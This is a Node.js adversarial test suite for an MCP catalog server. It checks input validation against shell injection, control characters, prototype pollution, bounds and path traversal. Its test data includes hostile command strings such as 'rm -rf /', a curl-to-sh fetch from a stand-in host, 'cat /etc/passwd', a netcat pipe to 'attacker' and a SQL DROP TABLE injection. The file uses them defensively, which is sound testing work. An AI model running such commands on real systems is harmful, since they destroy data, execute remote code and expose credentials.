#!/usr/bin/env node
/**
 * test-adversarial.mjs — adversarial input tests for cwi-mcp-public.
 *
 * Proves: malicious tool arguments are rejected or safely neutralized,
 * never executed, never echoed as raw control bytes, never persisted.
 *
 * Covers: shell metacharacters, ANSI escapes, null bytes, CR/LF log-injection,
 * prototype pollution, type confusion, integer bounds, oversize strings,
 * case-sensitive ID patterns, Bearer length caps (HTTP).
 *
 * `npm test` runs this alongside the unit + HTTP suites.
 */
import { runTool, handleMessage, CwiError } from '../src/server.mjs';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

let passed = 0, failed = 0;
const fails = [];
function check(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  ok   ${name}`); }
  else { failed++; fails.push(name); console.log(`  FAIL ${name} ${extra}`); }
}
async function expectCwiError(name, fn, code) {
  try { await fn(); check(name, false, `expected ${code}, no error thrown`); }
  catch (e) { check(name, e instanceof CwiError && e.code === code, `got ${e && e.code}: ${e && e.message}`); }
}
const hasControlChars = (s) => /[\u0000-\u001F\u007F]/.test(s);

// ---- 1. shell / command-injection shaped input is inert --------------------
const shellShapes = [
  '; rm -rf /',
  '$(curl evil.example/x | sh)',
  '`id`',
  '&& cat /etc/passwd',
  '| nc attacker 4444',
  'query"; DROP TABLE tracks; --',
];
for (const q of shellShapes) {
  const r = await runTool('catalog_search_v1', { query: q });
  check(`shell-shaped query inert: ${JSON.stringify(q.slice(0, 24))}`, typeof r.total_hits === 'number' && !hasControlChars(JSON.stringify(r)));
}

// ---- 2. control characters are stripped, never echoed raw -----------------
const evil = 'diabolique\x00\x1b[31mRED\x1b[0m\r\nX-Injected: 1\t';
const r2 = await runTool('catalog_search_v1', { query: evil });
// ESC byte stripped -> ANSI sequence neutralized; printable remnants are inert text
check('control chars stripped from echo', r2.query === 'diabolique[31mRED[0mX-Injected: 1' && !hasControlChars(r2.query), JSON.stringify(r2.query));
check('control-char query still searches safely', typeof r2.total_hits === 'number');

// ---- 3. prototype pollution attempt ---------------------------------------
const protoArgs = JSON.parse('{"query":"x","__proto__":{"polluted":true}}');
await expectCwiError('__proto__ key rejected as unknown field', async () => runTool('catalog_search_v1', protoArgs), 'cwi.invalid_params');
check('no prototype pollution occurred', ({}).polluted === undefined);

// ---- 4. type confusion / bounds -------------------------------------------
await expectCwiError('float limit rejected', async () => runTool('catalog_search_v1', { query: 'x', limit: 1.5 }), 'cwi.invalid_params');
await expectCwiError('huge limit rejected', async () => runTool('catalog_search_v1', { query: 'x', limit: 9999999999999999 }), 'cwi.invalid_params');
await expectCwiError('zero limit rejected', async () => runTool('catalog_search_v1', { query: 'x', limit: 0 }), 'cwi.invalid_params');
await expectCwiError('string limit rejected', async () => runTool('catalog_search_v1', { query: 'x', limit: '10' }), 'cwi.invalid_params');
await expectCwiError('10k-char query rejected', async () => runTool('catalog_search_v1', { query: 'x'.repeat(10000) }), 'cwi.invalid_params');
await expectCwiError('null query rejected', async () => runTool('catalog_search_v1', { query: null }), 'cwi.invalid_params');
await expectCwiError('nested array as query rejected', async () => runTool('catalog_search_v1', { query: ['x'] }), 'cwi.invalid_params');

// ---- 5. ID pattern strictness ---------------------------------------------
await expectCwiError('uppercase track_id rejected', async () => runTool('catalog_track_get_v1', { track_id: 'DIABOLIQUE' }), 'cwi.invalid_params');
await expectCwiError('track_id with path traversal rejected', async () => runTool('catalog_track_get_v1', { track_id: '../../secret' }), 'cwi.invalid_params');
await expectCwiError('track_id with semicolon rejected', async () => runTool('catalog_track_get_v1', { track_id: 'a;b' }), 'cwi.invalid_params');
const lowerIsrc = await runTool('catalog_isrc_lookup_v1', { isrc: 'qz8ef2666377' });
check('lowercase ISRC normalized + accepted', lowerIsrc.status === 'verified' && lowerIsrc.track.title === 'Diabolique');
await expectCwiError('13-char ISRC rejected', async () => runTool('catalog_isrc_lookup_v1', { isrc: 'QZ8EF26663771' }), 'cwi.invalid_params');

// ---- 6. JSON-RPC layer: non-object arguments, weird tool names -------------
const m1 = await handleMessage({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'catalog_search_v1', arguments: 'nope' } });
check('string arguments -> isError', m1.result && m1.result.isError === true);
const m2 = await handleMessage({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: '__proto__', arguments: {} } });
check('weird tool name -> isError', m2.result && m2.result.isError === true);
const m3 = await handleMessage({ jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'catalog_search_v1' } });
check('missing arguments defaults safely', m3.result && m3.result.isError === true); // query required

// ---- 7. HTTP: overlong Bearer header rejected -----------------------------
const HERE = dirname(fileURLToPath(import.meta.url));
const SRC = join(HERE, '..', 'src', 'server-http.mjs');
const PORT = 18773;
const TOKEN = `adv-test-${Date.now()}`;
const child = spawn('node', [SRC], {
  env: { ...process.env, PORT: String(PORT), BIND: '127.0.0.1', MCP_TOKEN: TOKEN, RATE_PER_MIN: '1000' },
  stdio: ['ignore', 'ignore', 'ignore'],
});
try {
  for (let i = 0; i < 50; i++) {
    try { const r = await fetch(`http://127.0.0.1:${PORT}/health`); if (r.ok) break; } catch { /* */ }
    await new Promise((res) => setTimeout(res, 200));
  }
  const longBearer = 'Bearer ' + 'A'.repeat(500);
  const rr = await fetch(`http://127.0.0.1:${PORT}/mcp`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: longBearer },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping' }),
  });
  check('>256-char Bearer -> 401 (never compared/logged)', rr.status === 401, `status ${rr.status}`);

  // exact-token still works after adversarial attempts
  const ok = await fetch(`http://127.0.0.1:${PORT}/mcp`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${TOKEN}` },
    body: JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'catalog_search_v1', arguments: { query: 'x\u0000y' } } }),
  });
  const oj = await ok.json();
  const echoed = JSON.parse(oj.result.content[0].text).query;
  check('control-char query over HTTP echoed clean', ok.status === 200 && echoed === 'xy', JSON.stringify(echoed));
} finally {
  child.kill('SIGTERM');
}

console.log(`\nadversarial: ${passed} passed, ${failed} failed`);
if (fails.length) { console.log('failed:', fails.join(', ')); process.exit(1); }
